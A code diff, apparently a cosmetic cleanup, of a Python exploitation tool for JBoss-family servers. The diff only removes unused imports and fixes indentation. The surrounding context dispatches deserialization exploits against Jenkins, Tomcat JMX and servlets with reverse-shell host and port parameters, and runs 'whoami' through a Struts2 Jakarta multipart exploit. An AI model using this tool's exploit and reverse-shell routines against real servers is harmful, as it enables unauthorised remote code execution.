@@ -26,13 +26,11 @@ import signal
 import _exploits
 import _updates
 from os import name, system
-import os, sys
-import shutil
-from zipfile import ZipFile
+import sys
 from time import sleep
 from random import randint
 import argparse, socket
-from sys import argv, exit, version_info
+from sys import exit, version_info
 logging.captureWarnings(True)
 FORMAT = "%(asctime)s (%(levelname)s): %(message)s"
 logging.basicConfig(filename='jexboss_'+str(datetime.datetime.today().date())+'.log', format=FORMAT, level=logging.INFO)
@@ -552,7 +550,7 @@ def auto_exploit(url, exploit_type):
         host, port = get_host_port_reverse_params()
         if host == port == gl_args.cmd == None: return False
         result = _exploits.exploit_jenkins(url, host=host, port=port, cmd=gl_args.cmd, is_win=gl_args.windows,
-                                                   gadget=gl_args.gadget, show_payload=gl_args.show_payload)
+                                           gadget=gl_args.gadget, show_payload=gl_args.show_payload)
     elif exploit_type == "JMX Tomcat":
 
         host, port = get_host_port_reverse_params()
@@ -577,7 +575,7 @@ def auto_exploit(url, exploit_type):
         if host == port == gl_args.cmd == gl_args.load_gadget == None: return False
 
         result = _exploits.exploit_servlet_deserialization(url, host=host, port=port, cmd=gl_args.cmd, is_win=gl_args.windows,
-                                                               gadget=gl_args.gadget, gadget_file=gl_args.load_gadget)
+                                                           gadget=gl_args.gadget, gadget_file=gl_args.load_gadget)
 
     elif exploit_type == "Struts2":
 
@@ -686,7 +684,7 @@ def shell_http_struts(url):
                     )
     print_and_flush("# ----------------------------------------- #\n")
 
-    resp = _exploits.exploit_struts2_jakarta_multipart(url,'whoami', gl_args.cookies)
+    resp = _exploits.exploit_struts2_jakarta_multipart(url, 'whoami', gl_args.cookies)
 
     print_and_flush(resp.replace('\\n', '\n'), same_line=True)
     logging.info("Server %s exploited!" %url)
